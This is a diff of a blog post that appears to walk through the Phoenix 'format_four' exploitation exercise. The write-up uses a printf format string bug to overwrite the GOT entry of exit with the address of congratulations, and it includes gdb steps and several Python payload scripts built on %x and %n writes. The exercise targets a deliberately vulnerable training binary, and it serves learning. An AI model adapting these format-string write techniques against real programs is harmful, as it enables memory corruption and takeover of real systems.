@@ -8,7 +8,7 @@ toc: true
 ---
 
 ## Introduction
-I will be explaining how i did the challenge format_three from the series Phoenix found at <https://exploit.education/phoenix/format-four/>
+I will be explaining how i did the challenge format_four from the series Phoenix found at <https://exploit.education/phoenix/format-four/>
 
 ## Step one
 Firstly, i inspect the source code, this time i will be exploiting the function __printf__:
@@ -62,39 +62,76 @@ int main(int argc, char **argv) {
 The goal of this challenge is to overwrite the GOT address of the __exit__ function with that of __congratulations__. 
 
 
-## Step two
-Firstly, i need to retrieve the memory address of the __exit__ function. This can be found by running "objump -r format_four.elf"
+## Step two - determining __exit__ address 
 
-![](assets/posts/PWN/phoenix_format_four/address.png)
+Firstly, i need to retrieve the memory address of the __exit__ function. This can be found by running `objump -R format_four.elf`. 
 
-Secondly, i need to determine the base address of the executable which can be found by running "info proc mappings"
+![](assets/posts/PWN/phoenix_format_four/exit_addr.png)
+
+Secondly, i need to determine the base address of the executable which can be found by running `info proc mappings` in gdb. 
 
 ![](assets/posts/PWN/phoenix_format_four/procmap.png)
 
-As the base address is `0x56555000`, i need to add `0x00004010` which gives `0x56559010` which should be the address of __exit__. Hence, my currrent payload looks like this:
-
-
-At the breakpoint , i can see it is located at a 12 bytes offset, hence i will use "%x" 12 times. 
-Thirdly, i need to set a breakpoint before __printf__ in __bounce__ to determine where my input is stored on the stack.
-
-![](assets/posts/PWN/phoenix_format_four/bp.png)
- 
+As the base address is `0x56555000`, i need to add `0x00004010` which gives `0x56559010` , hence my current payload looks like this:
 
 ```
 import sys
 changeme = b"\x10\x90\x55\x56"
-changeme += b"%x" * 12
+changeme += b"\x11\x90\x55\x56"
+changeme += b"\x12\x90\x55\x56"
+changeme += b"\x13\x90\x55\x56"
+```
+
+## Step three - determine where my input is located
+I need to set a breakpoint before __printf__ in __bounce__ to determine where my input is stored on the stack. 
+
+![](assets/posts/PWN/phoenix_format_four/stack.png)
+
+Based on the image above, it is located at an offset of 11 bytes. Hence i will add `%x` 11 times in my payload. Afterwards i will add `%n` to write to `0x56559010` which allows me to check how many bytes are counted so far. 
+
+```
+import sys
+changeme = b"\x10\x90\x55\x56"
+changeme += b"%x" * 11
 changeme += b"%n"
 
 sys.stdout.buffer.write(changeme)
-
 ```
-When running the payload, set a breakpoint at __exit___ in the __bounce__ function. This allows me to view the value of `0x56559010` before called. This also proves that the current payload works. 
+
+When running the payload, set a breakpoint at __exit___ in the __bounce__ function. This allows me to view the value of `0x56559010` which indicates the remaining number of "junk" bytes to write. 
 
 ![](assets/posts/PWN/phoenix_format_four/works.png)
 
-## Step three
-Repeat what was done previously for phoenix format three except that the number of bytes to write should correspond to the address of __congratulations__ 
+## Step four - set payload
+Repeat what was done previously for phoenix format three except that the number of bytes to write should correspond to the address of __congratulations__ . This gives me a payload of
+
+```
+import sys
+changeme = b"\x10\x90\x55\x56"
+changeme += b"\x11\x90\x55\x56"
+changeme += b"\x12\x90\x55\x56"
+changeme += b"\x13\x90\x55\x56"
+#changeme = b"AAAA"
+changeme += b"%x" * 11
+#changeme += b"%n"
+
+changeme += b"A"*130
+changeme += b"%n"
+
+changeme += b"A" * 138
+changeme += b"%n"
+
+changeme += b"A" * 244
+changeme += b"%n"
+
+changeme += b"A" * 1
+changeme += b"%n"
+
+#changeme += b"A" *115
+#changeme += b"%n"
+sys.stdout.buffer.write(changeme)
+```
+After running the payload, i can see that the payload works as shown below.
 
 ![](assets/posts/PWN/phoenix_format_four/flag.png)
 
